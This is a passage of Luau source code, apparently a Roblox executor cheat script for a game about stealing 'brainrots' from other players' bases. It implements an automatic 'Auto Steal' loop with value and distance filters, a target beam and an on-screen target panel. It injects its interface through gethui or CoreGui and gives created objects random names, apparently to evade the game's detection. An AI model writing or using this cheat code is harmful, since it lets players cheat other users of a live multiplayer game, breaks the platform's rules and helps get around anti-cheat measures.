				if not (not flag2 or not flag3 or arg2 ~= n5) and not (arg3 and localPlayer:GetAttribute("Stealing") ~= true) then
					local character_ = localPlayer.Character
					local humanoidRootPart = character_ and character_:FindFirstChild("HumanoidRootPart")

					if humanoidRootPart then
						if flag4 then
							local prompt3 = arg.Prompt
							if not (not prompt3 or not prompt3.Parent or not prompt3.Enabled or tostring(prompt3.ActionText) ~= str or fn4(prompt3)) then
								local position = arg.Position
								return not position or (humanoidRootPart.Position - position).Magnitude <= n3
							end
						else
							if prompt2 and prompt2.Parent then
								return arg.Prompt == prompt2
							end
							local v

							if str2 and (string.find(str2, "Mac Lib") or string.find(str2, "Original")) then
								local v2
								v2, v = fn14(humanoidRootPart)
							else
								local v2
								v2, v = fn15(humanoidRootPart)
							end

							if v then
								if v.Prompt == arg.Prompt then
									return true
								end
								return v.Distance >= (humanoidRootPart.Position - arg.Position).Magnitude - n
							end
						end
					end
				end

				return false
			end

			local function runUntilTimeout4(arg)
				local prompt3 = prompt
				local prompt4 = prompt

				if prompt3 then
					prompt4 = prompt3.Parent
				end

				if prompt4 then
					local now = os.clock()

					while true do
						if flag2 and flag3 and arg == n5 and os.clock() - now < 1 and not (prompt3.Enabled and tostring(prompt3.ActionText) == str) then
							task.wait(0.05)
							continue
						end
						break
					end
				else
					task.wait(0.2)
				end
			end

			local function fn26(arg)
				local flag9 = false

				while true do
					if flag2 and flag3 and arg == n5 then
						local flag10 = localPlayer:GetAttribute("Stealing") == true

						if not flag9 then
							if str2 and string.find(str2, "v19") then
								task.wait()
							else
								task.wait(0.1)
							end
						end

						local flag11 = not flag2 or not flag3 or arg ~= n5
						flag9 = false

						if not flag11 then
							if not (str2 and string.find(str2, "v20")) and localPlayer:GetAttribute("Stealing") == true then
								flag7 = true
								fn17()

								if flag5 then
									fn20("GET READY - carrying brainrot", "")
								end

								while flag2 and flag3 and arg == n5 and localPlayer:GetAttribute("Stealing") == true do
									if str2 and string.find(str2, "v19") then
										task.wait()
										continue
									end
									task.wait(0.05)
								end

								if not (str2 and string.find(str2, "v19")) then
									runUntilTimeout4(arg)
								end

								flag7 = false
								if str2 and string.find(str2, "v19") then
									flag9 = true
									continue
								end
								continue
							end

							if not (str2 and string.find(str2, "v20")) then
								fn13(nil)
							end

							flag7 = false
							local character_ = localPlayer.Character
							character_ = character_ and character_:FindFirstChild("HumanoidRootPart")
							if not character_ then
								fn17()
								continue
							end
							local v, v2, v3

							if flag4 then
								v, v2, v3 = fn15(character_)
							else
								v, v2 = fn14(character_)
								v3 = nil
							end

							local v4 = fn9(character_, v, v2, v3)
							fn12(v4)

							if not v4 then
								fn17()
							else
								prompt = v4.Prompt

								if not fn24(v4, arg, function()
									return fn25(v4, arg, false)
								end, runUntilTimeout2, false) then
									fn17()
								end
							end

							continue
						end
					end

					break
				end
			end

			fn10 = function()
				n5 += 1
				flag3 = true
				flag7 = false
				n7 = -math.huge
				fn21()
				task.spawn(fn26, n5)
			end
		end

		fn11 = function()
			flag3 = false
			flag7 = false
			n5 += 1
			fn17()
			fn13(nil)
			fn21()
		end

		local n12 = 0

		fn2(localPlayer:GetAttributeChangedSignal("Stealing"):Connect(function()
			if localPlayer:GetAttribute("Stealing") == true then
				n6 = os.clock()
				n12 += 1
				local n122 = n12

				task.spawn(function()
					task.wait(1.5)
					local flag32 = flag3

					if flag3 then
						flag32 = localPlayer:GetAttribute("Stealing") == true
					end

					if flag32 and n12 == n122 then
						fn11()
						task.wait(0.05)
						fn10()
					end
				end)
			else
				n12 += 1

				if not (os.clock() - n4 < 0.5) then
					local flag9 = false

					if RagdollController then
						local ok, result = pcall(function()
							return RagdollController.IsInRagdoll()
						end)

						if ok and result == true then
							flag9 = true
						end
					end

					if not flag9 then
						local character_ = localPlayer.Character
						character_ = character_ and character_:FindFirstChildOfClass("Humanoid")

						if character_ then
							local state = character_:GetState()

							if state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.FallingDown or state == Enum.HumanoidStateType.Ragdoll then
								flag9 = true
							end
						end
					end

					local flag10

					if not flag9 then
						local character_ = localPlayer.Character

						if character_ and character_:FindFirstChildOfClass("BallSocketConstraint", true) then
							flag10 = true
						else
							flag10 = flag9
						end
					else
						flag10 = flag9
					end

					if flag10 then
						flag6 = true
					end
				end
			end
		end))

		fn2(Workspace.ChildAdded:Connect(function(child)
			if child.Name == "Plots" then
				n7 = -math.huge
			end
		end))

		local plots = Workspace:FindFirstChild("Plots")

		if plots then
			fn2(plots.ChildAdded:Connect(function()
				n7 = -math.huge
			end))

			fn2(plots.ChildRemoved:Connect(function()
				n7 = -math.huge
			end))
		end

		local autoStealToggle

		autoStealToggle = autoStealBrainrotSection:CreateToggle({
			Name = "Auto Steal",
			Default = true,
			Callback = function(arg)
				str2 = "Auto Get Default"

				if arg then
					fn10()
				else
					fn11()
				end
			end,
		})

		local fn22

		fn22 = function()
			local get = autoStealToggle.Get

			if get and autoStealToggle:Get() ~= true then
				autoStealToggle:Set(true, true)
			end
		end

		autoStealBrainrotSection:CreateToggle({
			Name = "Steal Best Brainrot Only",
			Default = false,
			Quick = false,
			SubOf = autoStealToggle,
			Callback = function(arg)
				flag4 = arg == true
			end,
		})

		do
			local configMap = {
				["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
				["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
				["B/s"] = { Min = 1, Max = 10, Mult = 1e9 },
			}

			local createSlider = nil
			local n13 = 1
			local str3 = "M/s"

			local function fn23(arg, arg2)
				if arg ~= nil then
					n13 = math.floor(tonumber(arg) or n13)
				end

				if arg2 ~= nil then
					str3 = tostring(arg2)
				elseif createSlider and createSlider.GetUnit then
					local unit = createSlider:GetUnit()

					if unit and unit ~= "" then
						str3 = tostring(unit)
					end
				end

				n2 = n13 * (configMap[str3] or configMap["M/s"]).Mult
				n7 = -math.huge
			end

			local function fn24(arg)
				str3 = arg
				local configEntry = configMap[arg] or configMap["M/s"]

				if createSlider and createSlider.SetRange then
					createSlider:SetRange(configEntry.Min, configEntry.Max)
					local min = createSlider:Get() or configEntry.Min
					local min2 = configEntry.Min
					local max = configEntry.Max
					local n14 = math.clamp(math.floor(min + 0.5), min2, max)

					if n14 ~= min then
						createSlider:Set(n14)
					else
						fn23(n14, arg)
					end
				else
					fn23(nil, arg)
				end
			end

			createSlider = autoStealBrainrotSection.CreateSlider

			createSlider = createSlider(autoStealBrainrotSection, {
				Name = "Auto Steal Min Value",
				Note = "Filters out Brainrots below this threshold. Tap arrow to change unit (K/s, M/s, B/s).",
				Min = 0,
				Max = 1000,
				Default = 0,
				AllowDecimals = false,
				Increment = 1,
				Unit = {
					Default = "M/s",
					Selector = true,
					Options = { "K/s", "M/s", "B/s" },
					ColorEnabled = true,
					Colors = { Number = Color3.fromRGB(255, 255, 255), Suffix = Color3.fromRGB(58, 255, 55) },
					Callback = function(arg)
						fn24(arg)
					end,
				},
				Quick = false,
				SubOf = autoStealToggle,
				Callback = function(arg)
					fn23(arg, nil)
				end,
			})
		end

		autoStealBrainrotSection:CreateSlider({
			Name = "Auto Steal Distance",
			Min = 10,
			Max = 200,
			Default = 58,
			AllowDecimals = false,
			Increment = 1,
			Unit = " studs",
			Quick = false,
			SubOf = autoStealToggle,
			Callback = function(arg)
				n3 = math.clamp(tonumber(arg) or 20, 10, 200)
			end,
		})

		local fn23

		do
			local color = Color3.fromRGB(170, 255, 0)
			local color2 = Color3.fromRGB(240, 255, 210)
			local flag9 = false
			local attachment = nil
			local attachment2 = nil
			local beam = nil
			local parent = nil
			local parent2 = nil
			local n13 = -math.huge

			fn23 = function()
				pcall(function()
					if beam then
						beam:Destroy()
					end
				end)

				pcall(function()
					if attachment then
						attachment:Destroy()
					end
				end)

				pcall(function()
					if attachment2 then
						attachment2:Destroy()
					end
				end)

				beam = nil
				attachment = nil
				attachment2 = nil
				parent = nil
				parent2 = nil
			end

			local function fn24()
				local v = Workspace:FindFirstChild(localPlayer.Name)

				if not (not v or not v:IsA("Model")) then
					local humanoidRootPart = v:FindFirstChild("HumanoidRootPart")

					if not (humanoidRootPart and humanoidRootPart:IsA("BasePart") and humanoidRootPart.Parent == v) then
						humanoidRootPart = v:FindFirstChild("__HITBOX") or v:FindFirstChild("__hitbox") or v:FindFirstChild("Hitbox") or v:FindFirstChild("HitBox")
						if not (humanoidRootPart and humanoidRootPart:IsA("BasePart")) then
							return nil
						end
					end

					return humanoidRootPart
				end

				return nil
			end

			local function fn25(parent3, parent4)
				fn23()
				if not (parent3 and parent4) then
					return
				end
				attachment = Instance.new("Attachment")
				attachment.Name = generateRandomId()
				attachment.Position = Vector3.new(0, 0.6, 0)
				attachment.Parent = parent3
				attachment2 = Instance.new("Attachment")
				attachment2.Name = generateRandomId()
				attachment2.Position = Vector3.new(0, 2.6, 0)
				attachment2.Parent = parent4
				beam = Instance.new("Beam")
				beam.Name = generateRandomId()
				beam.Archivable = false
				beam.Attachment0 = attachment
				beam.Attachment1 = attachment2
				beam.Color = ColorSequence.new(color, color2)
				beam.CurveSize0 = 0
				beam.CurveSize1 = 0
				beam.FaceCamera = true
				beam.LightEmission = 1
				beam.Segments = 4
				beam.Texture = "rbxassetid://446111271"
				beam.TextureLength = 3
				beam.TextureMode = Enum.TextureMode.Wrap
				beam.TextureSpeed = 3
				local beam2 = beam
				local numberSequenceNew = NumberSequence.new
				local tbl4 = {}
				local keypoint = NumberSequenceKeypoint.new(0, 0)
				local keypoint2 = NumberSequenceKeypoint.new(0.85, 0)
				tbl4[1] = keypoint
				tbl4[2] = keypoint2

				do
					local values = table.pack(NumberSequenceKeypoint.new(1, 0.25))
					table.move(values, 1, values.n, 3, tbl4)
				end

				beam2.Transparency = numberSequenceNew(tbl4)
				beam.Width0 = 0.34
				beam.Width1 = 0.7
				beam.ZOffset = 0.1
				weakCache[beam] = true
				beam.Parent = attachment
				parent = parent3
				parent2 = parent4
			end

			local function fn26()
				if not (flag9 and flag3) then
					if beam then
						fn23()
					end
				else
					local now = os.clock()

					if not (now - n13 < 0.1) then
						n13 = now
						local character_ = localPlayer.Character
						local humanoidRootPart = character_ and character_:FindFirstChild("HumanoidRootPart")
						local v = fn24(character_)
						if not (humanoidRootPart and v) then
							fn23()
							return
						end
						local v2, v3, v4 = fn15(humanoidRootPart)
						local v5 = fn9(humanoidRootPart, v2, v3, v4)
						local v52 = v5 and fn7(v5.Prompt) or nil
						v52 = v52 and v52.Spawn or nil
						if not v52 then
							fn23()
							return
						end
						local flag10 = parent ~= v or parent2 ~= v52

						if not flag10 then
							flag10 = not (attachment and attachment.Parent)
						end

						if flag10 then
							fn25(v, v52)
						end
					end
				end
			end

			fn2(RunService.Heartbeat:Connect(function()
				if flag2 then
					fn26()
				end
			end))

			autoStealBrainrotSection:CreateToggle({
				Name = "Target Beam",
				Note = "Draws a straight amber line to the Brainrot Auto Steal is targeting.",
				Default = true,
				Quick = false,
				SubOf = autoStealToggle,
				Callback = function(arg)
					flag9 = arg == true

					if not flag9 then
						fn23()
					end
				end,
			})
		end

		local n13
		n13 = 140
		local n14
		n14 = 5
		local n15
		n15 = 0.5
		local color
		color = Color3.fromRGB(58, 255, 55)
		local n16
		n16 = 214
		local n17
		n17 = 40
		local n18
		n18 = 44
		local screenGui
		screenGui = nil
		local frame3
		frame3 = nil
		local frame4
		frame4 = nil
		local iMap
		iMap = {}
		local textLabel3
		textLabel3 = nil
		local frame5
		frame5 = nil
		local flag9, n19, n20, clampValue, flag10, n21, str3, destroyAll2

		do
			local textLabel4 = nil
			local v = nil
			local frame6 = nil
			flag9 = false
			n19 = 5
			n20 = 1
			clampValue = nil
			flag10 = false
			n21 = -math.huge
			local plot = nil
			local n22 = -math.huge
			str3 = ""
			local gothamBold = Enum.Font.GothamBold

			pcall(function()
				gothamBold = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal)
			end)

			local function fn24(arg)
				if typeof(gothamBold) == "Font" then
					arg.FontFace = gothamBold
				else
					arg.Font = Enum.Font.GothamBold
				end
			end

			local v2 = mainWindow:CreateState({
				Name = "Base Target Panel Position",
				Default = {
					XOffset = 0,
					XScale = 0.78183454275131226,
					YScale = 0.022769367322325706,
					YOffset = 0,
				},
			})

			local function getUDim2()
				local v3 = v2:Get()
				if type(v3) == "table" and type(v3.XOffset) == "number" and type(v3.YOffset) == "number" then
					return UDim2.new(tonumber(v3.XScale) or 1, v3.XOffset, tonumber(v3.YScale) or 0.5, v3.YOffset)
				end
				return UDim2.new(1, -18, 0.5, 0)
			end

			local function fn25(arg)
				v2:Set({ XScale = arg.X.Scale, XOffset = arg.X.Offset, YScale = arg.Y.Scale, YOffset = arg.Y.Offset })
			end

			local tweenInfo = TweenInfo.new(0.28, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
			local n23 = 0
			local plot2 = nil

			local function fn26()
				if frame3 then
					local visible2 = not flag9

					if textLabel4 then
						textLabel4.Visible = visible2
						textLabel4.Text = plot2 and "no brainrot left in this base" or "no base nearby"
					end

					local flag92 = flag9 and 0 or n23
					local n24

					if flag92 > 0 then
						n24 = (n17 + 4) * flag92 + 4
					else
						n24 = 0

						if visible2 then
							n24 = 26
						end
					end

					local n25 = n18 + n24

					if v ~= n25 then
						v = n25

						if frame5 then
							if n24 > 0 then
								frame5.Visible = true
							end

							TweenService:Create(frame5, tweenInfo, { Size = UDim2.new(1, -20, 0, math.max(n24, 1)) }):Play()
						end

						local tween = TweenService:Create(frame3, tweenInfo, { Size = UDim2.fromOffset(214, n25) })

						if n24 <= 0 and frame5 then
							tween.Completed:Connect(function()
								if frame5 and v == n25 then
									frame5.Visible = false
								end
							end)
						end

						tween:Play()
						return
					end
				end
			end

			destroyAll2 = function()
				table.clear(iMap)
				frame3 = nil
				frame4 = nil
				textLabel3 = nil
				frame5 = nil
				textLabel4 = nil
				v = nil
				frame6 = nil
				clampValue = nil
				str3 = ""

				if screenGui then
					pcall(function()
						screenGui:Destroy()
					end)

					screenGui = nil
				end
			end

			local function fn27(arg, arg2)
				local debris = Workspace:FindFirstChild("Debris")
				if not debris or arg2 == "" then
					return nil
				end
				local magnitude = nil
				local animalOverhead = nil

				for _, child in ipairs(debris:GetChildren()) do
					if child.Name == "FastOverheadTemplate" and child:IsA("BasePart") then
						local animalOverhead2 = child:FindFirstChild("AnimalOverhead")
						local displayName = animalOverhead2 and animalOverhead2:FindFirstChild("DisplayName")

						if displayName and displayName:IsA("TextLabel") and displayName.Text == arg2 then
							local magnitude2 = (child.Position - arg.Position).Magnitude

							if not magnitude or magnitude2 < magnitude then
								magnitude = magnitude2
								animalOverhead = animalOverhead2
							end
						end
					end
				end

				if animalOverhead and magnitude and magnitude <= 14 then
					return animalOverhead
				end
				return nil
			end

			local function fn28(arg, arg2, arg3)
				if not (arg and arg2) or arg3 == "" then
					return nil
				end
				local magnitude = nil
				local child = nil

				for _, child2 in ipairs(arg:GetChildren()) do
					if child2:IsA("Model") and child2.Name == arg3 then
						local ok, result = pcall(function()
							return child2:GetPivot()
						end)

						if ok then
							local magnitude2 = (result.Position - arg2.Position).Magnitude

							if not magnitude or magnitude2 < magnitude then
								child = child2
								magnitude = magnitude2
							end
						end
					end
				end

				if child and magnitude and magnitude <= 14 then
					return child
				end
				return nil
			end

			local str4 = ""

			local function fn29(arg, painted)
				if arg.Painted ~= painted then
					arg.Painted = painted
					local v3 = ipairs
					local tweens = arg.Tweens or {}

					for _, tween in v3(tweens) do
						pcall(function()
							tween:Cancel()
						end)
					end

					local tweens2 = {}
					local tween = TweenService:Create(arg.Accent, tweenInfo, { Size = UDim2.new(0, painted and 3 or 0, 1, -12) })
					local tween2 = TweenService:Create(arg.Stroke, tweenInfo, { Color = painted and color or Color3.fromRGB(255, 255, 255), Transparency = painted and 0.1 or 0.86 })
					local TweenService2 = TweenService
					local create = TweenService2.Create
					local row = arg.Row
					local tbl4 = { BackgroundTransparency = painted and 0.12 or 0.4 }
					local v4 = table.pack(create(TweenService2, row, tweenInfo, tbl4))
					tweens2[1] = tween
					tweens2[2] = tween2

					do
						local values = table.pack(table.unpack(v4, 1, v4.n))
						table.move(values, 1, values.n, 3, tweens2)
					end

					arg.Tweens = tweens2

					for _, tween3 in ipairs(arg.Tweens) do
						tween3:Play()
					end
				end
			end

			local function fn30()
				for _, v3 in ipairs(iMap) do
					fn29(v3, prompt2 ~= nil and v3.Prompt == prompt2)
				end
			end

			local function fn31(layoutOrder)
				local textButton = Instance.new("TextButton")
				textButton.AutoButtonColor = false
				textButton.BackgroundColor3 = Color3.fromRGB(30, 30, 36)
				textButton.BackgroundTransparency = 0.3
				textButton.BorderSizePixel = 0
				textButton.LayoutOrder = layoutOrder
				textButton.Size = UDim2.new(1, 0, 0, 40)
				textButton.Text = ""
				textButton.Parent = frame4
				Instance.new("UICorner", textButton).CornerRadius = UDim.new(0, 9)
				local frame7 = Instance.new("Frame")
				frame7.AnchorPoint = Vector2.new(0, 0.5)
				frame7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				frame7.BorderSizePixel = 0
				frame7.Position = UDim2.new(0, 0, 0.5, 0)
				frame7.Size = UDim2.new(0, 0, 1, -12)
				frame7.ZIndex = 4
				frame7.Parent = textButton
				Instance.new("UICorner", frame7).CornerRadius = UDim.new(1, 0)
				local uiGradient = Instance.new("UIGradient")
				local colorSequenceKeypointNew = ColorSequenceKeypoint.new
				local color3FromRGB = Color3.fromRGB
				uiGradient.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(58, 255, 55)), colorSequenceKeypointNew(1, color3FromRGB(20, 109, 0)) })
				uiGradient.Rotation = 90
				uiGradient.Parent = frame7
				local uiStroke = Instance.new("UIStroke")
				uiStroke.Thickness = 1.3
				uiStroke.Parent = textButton
				local viewportFrame = Instance.new("ViewportFrame")
				viewportFrame.Ambient = Color3.fromRGB(190, 190, 200)
				viewportFrame.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
				viewportFrame.BackgroundTransparency = 0.25
				viewportFrame.BorderSizePixel = 0
				viewportFrame.LightColor = Color3.fromRGB(255, 255, 255)
				viewportFrame.LightDirection = Vector3.new(-0.4, -0.7, -0.6)
				viewportFrame.Position = UDim2.fromOffset(4, 3)
				viewportFrame.Size = UDim2.fromOffset(n17 - 6, n17 - 6)
				viewportFrame.Parent = textButton
				Instance.new("UICorner", viewportFrame).CornerRadius = UDim.new(0, 8)
				local camera = Instance.new("Camera")
				camera.Parent = viewportFrame
				viewportFrame.CurrentCamera = camera
				local frame8 = Instance.new("Frame")
				frame8.AnchorPoint = Vector2.new(1, 1)
				frame8.BackgroundColor3 = Color3.fromRGB(10, 10, 13)
				frame8.BackgroundTransparency = 0.15
				frame8.BorderSizePixel = 0
				frame8.Position = UDim2.fromOffset(n17 - 3, n17 - 3)
				frame8.Size = UDim2.fromOffset(24, 13)
				frame8.ZIndex = 4
				frame8.Parent = textButton
				Instance.new("UICorner", frame8).CornerRadius = UDim.new(0, 5)
				local textLabel5 = Instance.new("TextLabel")
				textLabel5.BackgroundTransparency = 1
				textLabel5.Size = UDim2.fromScale(1, 1)
				textLabel5.Text = ""
				textLabel5.TextColor3 = Color3.fromRGB(255, 255, 255)
				textLabel5.TextScaled = true
				textLabel5.ZIndex = 5
				fn24(textLabel5)
				textLabel5.Parent = frame8
				local uiStroke2 = Instance.new("UIStroke")
				uiStroke2.Color = Color3.fromRGB(0, 0, 0)
				uiStroke2.Thickness = 1.4
				uiStroke2.Transparency = 0.25
				uiStroke2.Parent = textLabel5
				local textLabel6 = Instance.new("TextLabel")
				textLabel6.BackgroundTransparency = 1
				textLabel6.Position = UDim2.fromOffset(n17 + 2, 5)
				textLabel6.Size = UDim2.new(1, -n17 - 10, 0, 13)
				textLabel6.Text = ""
				textLabel6.TextColor3 = Color3.fromRGB(238, 238, 242)
				textLabel6.TextScaled = true
				textLabel6.TextTruncate = Enum.TextTruncate.AtEnd
				textLabel6.TextXAlignment = Enum.TextXAlignment.Left
				fn24(textLabel6)
				textLabel6.Parent = textButton
				local textLabel7 = chilliGithubFastManualDefaultsRu.CreateBrainrotNameStyle(textLabel6)
				local textLabel8 = Instance.new("TextLabel")
				textLabel8.BackgroundTransparency = 1
				textLabel8.Position = UDim2.fromOffset(n17 + 2, 20)
				textLabel8.Size = UDim2.fromOffset(62, 11)
				textLabel8.Text = ""
				textLabel8.TextColor3 = Color3.fromRGB(115, 255, 0)
				textLabel8.TextScaled = true
				textLabel8.TextXAlignment = Enum.TextXAlignment.Left
				fn24(textLabel8)
				textLabel8.Parent = textButton
				local textLabel9 = Instance.new("TextLabel")
				textLabel9.BackgroundTransparency = 1
				textLabel9.Position = UDim2.fromOffset(n17 + 66, 20)
				textLabel9.RichText = true
				textLabel9.Size = UDim2.fromOffset(62, 11)
				textLabel9.Text = ""
				textLabel9.TextScaled = true
				textLabel9.TextXAlignment = Enum.TextXAlignment.Left
				fn24(textLabel9)
				textLabel9.Parent = textButton
				local frame9 = Instance.new("Frame")
				frame9.AnchorPoint = Vector2.new(1, 0)
				frame9.BackgroundTransparency = 1
				frame9.Position = UDim2.new(1, -7, 0, 19)
				frame9.Size = UDim2.fromOffset(44, 12)
				frame9.Parent = textButton
				local uiListLayout = Instance.new("UIListLayout")
				uiListLayout.FillDirection = Enum.FillDirection.Horizontal
				uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Right
				uiListLayout.Padding = UDim.new(0, 2)
				uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
				uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
				uiListLayout.Parent = frame9

				local tbl4 = {
					Row = textButton,
					Accent = frame7,
					Stroke = uiStroke,
					Viewport = viewportFrame,
					Camera = camera,
					Rank = textLabel5,
					NameLabel = textLabel6,
					NameStyle = textLabel7,
					ValueLabel = textLabel8,
					MutationLabel = textLabel9,
					TraitHolder = frame9,
					Prompt = nil,
					RowKey = nil,
					ModelKey = nil,
					Clone = nil,
					Track = nil,
					SourceTrack = nil,
					Painted = nil,
					Tweens = nil,
				}

				fn3(textButton, function()
					if not tbl4.Prompt then
						return
					end

					if prompt2 == tbl4.Prompt then
						prompt2 = nil
						str4 = ""
					else
						prompt2 = tbl4.Prompt
						str4 = tbl4.NameLabel.Text
						fn22()
					end

					str3 = ""
					fn30()
				end)

				return tbl4
			end

			local function fn32()
				if not (screenGui and screenGui.Parent) then
					screenGui = Instance.new("ScreenGui")
					screenGui.Name = "ChilliAutoGetTargetPanel"
					screenGui.DisplayOrder = 5
					screenGui.IgnoreGuiInset = true
					screenGui.ResetOnSpawn = false
					screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
					local CoreGui2 = CoreGui

					if type(gethui) == "function" then
						local ok
						ok, CoreGui2 = pcall(gethui)
						ok = ok and typeof(CoreGui2) == "Instance"
						local CoreGui3 = CoreGui

						if not ok then
							CoreGui2 = CoreGui3
						end
					end

					screenGui.Parent = CoreGui2
					local frame7 = Instance.new("Frame")
					frame7.Active = true
					frame7.AnchorPoint = Vector2.new(1, 0)
					frame7.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
					frame7.BackgroundTransparency = 0.18
					frame7.BorderSizePixel = 0
					frame7.Position = getUDim2()
					frame7.Size = UDim2.fromOffset(214, 44)
					frame7.ClipsDescendants = true
					frame7.Parent = screenGui
					Instance.new("UICorner", frame7).CornerRadius = UDim.new(0, 14)
					frame3 = frame7
					local uiStroke = Instance.new("UIStroke")
					uiStroke.Color = Color3.fromRGB(255, 255, 255)
					uiStroke.Thickness = 1
					uiStroke.Transparency = 0.9
					uiStroke.Parent = frame7
					local uiScale = Instance.new("UIScale")
					uiScale.Parent = frame7

					local function clampValue2()
						local currentCamera = Workspace.CurrentCamera
						local viewportSize = currentCamera and currentCamera.ViewportSize or Vector2.new(1280, 720)

						if viewportSize.X < 1 then
							viewportSize = Vector2.new(1280, 720)
						end

						uiScale.Scale = math.clamp(viewportSize.X * 0.15 / n16, 0.7, 1.3) * n20
					end

					clampValue = clampValue2
					clampValue2()
					local currentCamera = Workspace.CurrentCamera

					if currentCamera then
						fn2(currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(clampValue2))
					end

					local handle = Instance.new("TextButton")
					handle.Name = "Handle"
					handle.Active = true
					handle.AutoButtonColor = false
					handle.BackgroundTransparency = 1
					handle.BorderSizePixel = 0
					handle.Position = UDim2.fromOffset(0, 0)
					handle.Size = UDim2.new(1, 0, 0, 44)
					handle.Text = ""
					handle.ZIndex = 2
					handle.Parent = frame7
					local fn33 = nil
					local flag11 = false
					local v3 = nil
					local flag12 = false
					local vector2 = Vector2.new(0, 0)
					local vector22 = Vector2.new(0, 0)

					handle.InputBegan:Connect(function()
					end)

					fn2(UserInputService2.InputChanged:Connect(function(input)
						if not (not (input == v3 or not v3) or not frame3) then
							local absoluteSize = screenGui.AbsoluteSize

							if not (absoluteSize.X <= 0 or absoluteSize.Y <= 0) then
								local n24 = Vector2.new(input.Position.X, input.Position.Y) - vector2

								if not (not flag12 and n24.Magnitude < 6) then
									flag12 = true
									frame7.Position = UDim2.fromScale(math.clamp(vector22.X + n24.X / absoluteSize.X, math.min(math.max(frame7.AbsoluteSize.X / absoluteSize.X, 0), 0.998), 0.998), math.clamp(vector22.Y + n24.Y / absoluteSize.Y, 0, 0.98))
									return
								end
							end
						end
					end))

					fn2(UserInputService2.InputEnded:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseButton1 or input == v3 then
							flag11 = false
							v3 = nil

							if flag12 then
								fn25(frame7.Position)
							elseif fn33 then
								fn33()
							end
						end
					end))

					local textLabel5 = Instance.new("TextLabel")
					textLabel5.BackgroundTransparency = 1
					textLabel5.Position = UDim2.fromOffset(32, 8)
					textLabel5.Size = UDim2.fromOffset(n16 - 102, 14)
					textLabel5.Text = "Base Targets"
					textLabel5.TextColor3 = Color3.fromRGB(240, 240, 244)
					textLabel5.TextScaled = true
					textLabel5.TextXAlignment = Enum.TextXAlignment.Left
					fn24(textLabel5)
					textLabel5.Parent = handle
					local textLabel6 = Instance.new("TextLabel")
					textLabel6.BackgroundTransparency = 1
					textLabel6.Position = UDim2.fromOffset(32, 23)
					textLabel6.Size = UDim2.fromOffset(n16 - 102, 10)
					textLabel6.Text = "walk into a base"
					textLabel6.TextColor3 = Color3.fromRGB(140, 140, 150)
					textLabel6.TextScaled = true
					textLabel6.TextXAlignment = Enum.TextXAlignment.Left
					fn24(textLabel6)
					textLabel6.Parent = handle
					textLabel3 = textLabel6
					local textButton = Instance.new("TextButton")
					textButton.AnchorPoint = Vector2.new(0, 0.5)
					textButton.AutoButtonColor = false
					textButton.BackgroundTransparency = 1
					textButton.BorderSizePixel = 0
					textButton.Position = UDim2.new(0, 8, 0, math.floor(n18 * 0.5))
					textButton.Size = UDim2.fromOffset(20, 20)
					textButton.Text = ""
					textButton.ZIndex = 6
					textButton.Parent = handle
					local frame8 = Instance.new("Frame")
					frame8.AnchorPoint = Vector2.new(0.5, 0.5)
					frame8.BackgroundTransparency = 1
					frame8.BorderSizePixel = 0
					frame8.Position = UDim2.fromScale(0.5, 0.5)
					frame8.Size = UDim2.fromScale(0.62, 0.62)
					frame8.Parent = textButton
					local uiAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
					uiAspectRatioConstraint.AspectRatio = 1
					uiAspectRatioConstraint.AspectType = Enum.AspectType.FitWithinMaxSize
					uiAspectRatioConstraint.DominantAxis = Enum.DominantAxis.Height
					uiAspectRatioConstraint.Parent = frame8

					for _, v4 in ipairs({ { 0.335355, 45 }, { 0.664645, -45 } }) do
						local frame9 = Instance.new("Frame")
						frame9.AnchorPoint = Vector2.new(0.5, 0.5)
						frame9.BackgroundColor3 = Color3.fromRGB(58, 255, 55)
						frame9.BorderSizePixel = 0
						frame9.Position = UDim2.fromScale(v4[1], 0.535355)
						frame9.Rotation = v4[2]
						frame9.Size = UDim2.fromScale(0.6657, 0.2)
						frame9.Parent = frame8
					end

					frame6 = frame8
					frame8.Rotation = flag9 and 180 or 0

					fn33 = function()
						flag9 = not flag9
						local TweenService2 = TweenService
						local create = TweenService2.Create
						local tbl4 = {}
						tbl4.Rotation = flag9 and 180 or 0
						create(TweenService2, frame8, tweenInfo, tbl4):Play()
						fn26()
					end

					fn3(textButton, fn33)
					local textButton2 = Instance.new("TextButton")
					textButton2.AnchorPoint = Vector2.new(1, 0)
					textButton2.AutoButtonColor = false
					textButton2.BackgroundColor3 = Color3.fromRGB(34, 34, 40)
					textButton2.BackgroundTransparency = 0.2
					textButton2.BorderSizePixel = 0
					textButton2.Position = UDim2.new(1, -10, 0, 8)
					textButton2.Size = UDim2.fromOffset(58, 20)
					textButton2.Text = ""
					textButton2.Parent = handle
					Instance.new("UICorner", textButton2).CornerRadius = UDim.new(1, 0)
					local uiStroke2 = Instance.new("UIStroke")
					uiStroke2.Color = Color3.fromRGB(255, 255, 255)
					uiStroke2.Thickness = 1.2
					uiStroke2.Transparency = 0.78
					uiStroke2.Parent = textButton2
					local textLabel7 = Instance.new("TextLabel")
					textLabel7.BackgroundTransparency = 1
					textLabel7.Position = UDim2.fromOffset(9, 5)
					textLabel7.Size = UDim2.fromOffset(9, 10)
					textLabel7.Text = "X"
					textLabel7.TextColor3 = Color3.fromRGB(226, 226, 232)
					textLabel7.TextScaled = true
					fn24(textLabel7)
					textLabel7.Parent = textButton2
					local textLabel8 = Instance.new("TextLabel")
					textLabel8.BackgroundTransparency = 1
					textLabel8.Position = UDim2.fromOffset(21, 5)
					textLabel8.Size = UDim2.fromOffset(30, 10)
					textLabel8.Text = "Clear"
					textLabel8.TextColor3 = Color3.fromRGB(226, 226, 232)
					textLabel8.TextScaled = true
